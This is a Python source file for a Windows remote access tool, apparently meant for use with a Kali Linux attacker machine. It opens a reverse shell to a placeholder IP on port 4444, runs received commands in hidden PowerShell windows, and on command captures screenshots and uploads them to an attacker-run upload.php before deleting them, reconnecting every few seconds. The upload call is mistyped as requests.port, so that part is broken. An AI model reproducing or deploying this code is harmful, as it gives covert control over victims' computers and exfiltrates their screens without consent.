import socket
import subprocess
import time
from PIL import ImageGrab
from pathlib import Path
import requests
import tempfile
import os
from datetime import datetime

ip_addr = "Write_Kali_Linux_IP_Address_here"
port = 4444

def capture_and_save_screenshot():
    try:
        screenshot = ImageGrab.grab()
        current_datetime = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_filename = f"screenshot_{current_datetime}.png"
        screenshot_path = os.path.join(tempfile.gettempdir(), screenshot_filename)
        screenshot.save(screenshot_path, "PNG")
        print(f"Screenshot captured and saved to: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None


def send_image_and_delete(image_path, upload_url):
    try:
        with open(image_path, 'rb') as file:
            files = {'file': (Path(image_path).name, file)}
            response = requests.port(upload_url, files=files)
            response.raise_for_status()
            print(response.text)
            os.remove(image_path)
            print(f"Image file {image_path} deleted.")
    except requests.RequestException as e:
        print(f"Error sending image: {e}")
    except OSError as e:
        print(f"Error deleting image: {e}")


def execute_powershell_command(command):
    try:
        powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        proc = subprocess.Popen(
            [powershell_path, command],
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            stdin = subprocess.PIPE,
            text = True,
            creationflags = subprocess.CREATE_NO_WINDOW,
        )
        stdout, stderr = proc.communicate()
        return stdout + stderr
    except Exception as e:
        return f"Error execution command: {e}"


def main():
    upload_url = 'http://Write_Kali_Linux_IP_Address_here/upload.php'
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((ip_addr, port))
            print("Connected to the server!")
            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    print(f"Received command: {data}")
                    if data == b'capture\n':
                        saved_screenshot_path = capture_and_save_screenshot()
                        if saved_screenshot_path:
                            send_image_and_delete(saved_screenshot_path, upload_url)
                    else:
                        command = data.decode('utf-8').strip()
                        result = execute_powershell_command(command)
                        client_socket.sendall(result.encode())
                except Exception as e:
                    print(f"Error: {e}")
                    break
        except Exception as e:
            print(f"Connection error: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            client_socket.close()
            print("Disconnected form the server.")


if __name__ == "__main__":
    main()
